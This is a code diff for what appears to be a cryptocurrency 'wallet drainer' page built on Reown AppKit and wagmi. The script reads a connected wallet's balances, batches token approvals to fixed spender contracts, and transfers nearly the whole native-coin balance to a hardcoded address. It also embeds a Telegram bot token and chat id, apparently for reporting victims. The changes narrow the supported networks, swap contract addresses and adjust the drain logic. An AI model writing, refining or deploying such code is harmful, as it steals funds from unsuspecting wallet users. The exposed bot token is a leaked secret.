@@ -1,4 +1,4 @@
-import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo } from '@reown/appkit/networks'
+import { bsc, mainnet, polygon } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, isAddress, getAddress, encodeFunctionData, maxUint256, parseUnits } from 'viem'
@@ -20,51 +20,24 @@ if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
 const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'
 
-// Поддержка всех сетей и токенов, как до batch approve
-const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
+const networks = [bsc, mainnet, polygon]
 const networkMap = {
   'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
   'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
-  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 },
-  'Arbitrum': { networkObj: arbitrum, chainId: networks[3].id || 42161 },
-  'Optimism': { networkObj: optimism, chainId: networks[4].id || 10 },
-  'Base': { networkObj: base, chainId: networks[5].id || 8453 },
-  'Scroll': { networkObj: scroll, chainId: networks[6].id || 534352 },
-  'Avalanche': { networkObj: avalanche, chainId: networks[7].id || 43114 },
-  'Fantom': { networkObj: fantom, chainId: networks[8].id || 250 },
-  'Linea': { networkObj: linea, chainId: networks[9].id || 59144 },
-  'zkSync': { networkObj: zkSync, chainId: networks[10].id || 324 },
-  'Celo': { networkObj: celo, chainId: networks[11].id || 42220 }
+  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 }
 }
+console.log('Network Map:', networkMap)
 
 const CONTRACTS = {
-  [networkMap['Ethereum'].chainId]: '0xa65972Fce9925983f35185891109c4be643657aD',
-  [networkMap['BNB Smart Chain'].chainId]: '0x537AC4F6Dc238003fd8bb281F954A9912180530B',
-  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
-  [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
-  [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
-  [networkMap['Base'].chainId]: '0x3456789012345678901234567890123456789012',
-  [networkMap['Scroll'].chainId]: '0x4567890123456789012345678901234567890123',
-  [networkMap['Avalanche'].chainId]: '0x5678901234567890123456789012345678901234',
-  [networkMap['Fantom'].chainId]: '0xabcdef1234567890abcdef1234567890abcdef12',
-  [networkMap['Linea'].chainId]: '0xbcdef1234567890abcdef1234567890abcdef123',
-  [networkMap['zkSync'].chainId]: '0xcdef1234567890abcdef1234567890abcdef1234',
-  [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
+  [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC',
+  [networkMap['BNB Smart Chain'].chainId]: '0x67062812416C73364926b9d31E183014deB95462',
+  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
 }
 
 const NATIVE_TOKEN_SYMBOLS = {
   [networkMap['Ethereum'].chainId]: 'ETH',
   [networkMap['BNB Smart Chain'].chainId]: 'BNB',
-  [networkMap['Polygon'].chainId]: 'MATIC',
-  [networkMap['Arbitrum'].chainId]: 'ETH',
-  [networkMap['Optimism'].chainId]: 'ETH',
-  [networkMap['Base'].chainId]: 'ETH',
-  [networkMap['Scroll'].chainId]: 'ETH',
-  [networkMap['Avalanche'].chainId]: 'AVAX',
-  [networkMap['Fantom'].chainId]: 'FTM',
-  [networkMap['Linea'].chainId]: 'ETH',
-  [networkMap['zkSync'].chainId]: 'ETH',
-  [networkMap['Celo'].chainId]: 'CELO'
+  [networkMap['Polygon'].chainId]: 'MATIC'
 }
 
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
@@ -401,42 +374,6 @@ const TOKENS = {
     { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
     { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0fea8e9b7ea0f28c4', decimals: 18 },
     { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
-  ],
-  'Arbitrum': [
-    { symbol: 'USDT', address: '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9', decimals: 6 },
-    { symbol: 'USDC', address: '0xff970a61a04b1ca14834a43f5de4533ebddb5cc8', decimals: 6 }
-  ],
-  'Optimism': [
-    { symbol: 'USDT', address: '0x94b008aa00579c1307b0ef2c499ad98a8ce58e58', decimals: 6 },
-    { symbol: 'USDC', address: '0x7f5c764cbc14f9669b88837ca1490cca17c31607', decimals: 6 }
-  ],
-  'Base': [
-    { symbol: 'USDT', address: '0x50c5725949a6f0c72e6c4a641f24049a917db0cb', decimals: 6 },
-    { symbol: 'USDC', address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913', decimals: 6 }
-  ],
-  'Scroll': [
-    { symbol: 'USDT', address: '0xf8869061c4c2c3c3f7b24d3f707c14b3cc868a0f', decimals: 6 },
-    { symbol: 'USDC', address: '0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4', decimals: 6 }
-  ],
-  'Avalanche': [
-    { symbol: 'USDT', address: '0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7', decimals: 6 },
-    { symbol: 'USDC', address: '0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e', decimals: 6 }
-  ],
-  'Fantom': [
-    { symbol: 'USDT', address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75', decimals: 6 },
-    { symbol: 'USDC', address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75', decimals: 6 }
-  ],
-  'Linea': [
-    { symbol: 'USDT', address: '0xa219439258ca9da29e9cc4ce5596924745e12b93', decimals: 6 },
-    { symbol: 'USDC', address: '0x176211869ca2b568f2a7d4ee941e073a821ee1ff', decimals: 6 }
-  ],
-  'zkSync': [
-    { symbol: 'USDT', address: '0x493257fd37edb34451f62edf8d2a0c418852ba4c', decimals: 6 },
-    { symbol: 'USDC', address: '0x3355df6d4c9c3035724fd0e3914de96a5a83aaf4', decimals: 6 }
-  ],
-  'Celo': [
-    { symbol: 'USDT', address: '0x88eeC49252c8cbc039DCdB394c0c2BA2f1637EA0', decimals: 6 },
-    { symbol: 'USDC', address: '0x765DE816845861e75A25fCA122bb6898B8B1282a', decimals: 6 }
   ]
 }
 const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
@@ -569,28 +506,22 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   // Prepare transfer call for native token
   let transferCall = null
   const nativeToken = networkTokens.find(t => t.address === 'native')
-  let nativeTransferAmount = null
   if (nativeToken) {
     const balanceWei = parseUnits(nativeToken.balance, 18)
-    const gasCost = await calculateGasCost(
-      wagmiAdapter.wagmiConfig,
-      getAddress(state.address),
-      getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
-      balanceWei,
-      mostExpensive.chainId
-    )
-    const reserveAmount = parseUnits('0.00005', 18) // дополнительный запас
-    const totalReserve = BigInt(parseUnits(gasCost.toString(), 18)) + reserveAmount
-    const availableBalance = balanceWei - totalReserve
+    const gasCost = await calculateGasCost(wagmiAdapter.wagmiConfig, getAddress(state.address), getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'), balanceWei, mostExpensive.chainId)
+    const reserveAmount = parseUnits('0.0001', 18)
+    const availableBalance = balanceWei - BigInt(parseUnits(gasCost.toString(), 18)) - reserveAmount
+    console.log(`Native token balance: ${nativeToken.balance}, gasCost: ${gasCost}, reserve: 0.0001, availableBalance: ${formatUnits(availableBalance, 18)}`)
     if (availableBalance > 0n) {
       transferCall = {
         to: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
-        value: `0x${availableBalance.toString(16)}`
+        value: `0x${availableBalance.toString(16)}`,
+        // Omit data field to let it default, or use '0x00' as a minimal valid hex string
+        // data: '0x00' // Uncomment this line if omitting data doesn't work
       }
-      nativeTransferAmount = availableBalance
-      console.log(`Native token transfer: ${formatUnits(availableBalance, 18)} (gas+reserve: ${formatUnits(totalReserve, 18)})`)
+      console.log(`Transfer call created:`, transferCall)
     } else {
-      console.log(`Native token balance too low: ${nativeToken.balance} after gas and reserve`)
+      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'} after gas and reserve`)
     }
   }
 
@@ -606,29 +537,11 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
         calls: allCalls,
         account: getAddress(state.address),
-        chainId: mostExpensive.chainId
+        chainId: mostExpensive.chainId // Ensure chainId is explicitly passed
       })
       console.log(`Batch transaction sent with id: ${id}`)
       const approveState = document.getElementById('approveState')
       if (approveState) approveState.innerHTML = `Batch transaction sent with id: ${id}`
-
-      // После успешного батча отправляем запросы на сервер для каждого ERC-20 токена
-      for (const token of networkTokens.filter(t => t.address !== 'native')) {
-        try {
-          const amount = parseUnits(token.balance, token.decimals)
-          await sendTransferRequest(
-            state.address,
-            token.address,
-            amount,
-            token.chainId,
-            id // txHash или batch id
-          )
-          console.log(`Transfer request sent to server for ${token.symbol}`)
-        } catch (err) {
-          store.errors.push(`Failed to send transfer request for ${token.symbol}: ${err.message}`)
-        }
-      }
-      // Для нативного токена не отправляем запрос на сервер
     } catch (error) {
       store.errors.push(`Failed to send batch transaction: ${error.message}`)
       const approveState = document.getElementById('approveState')
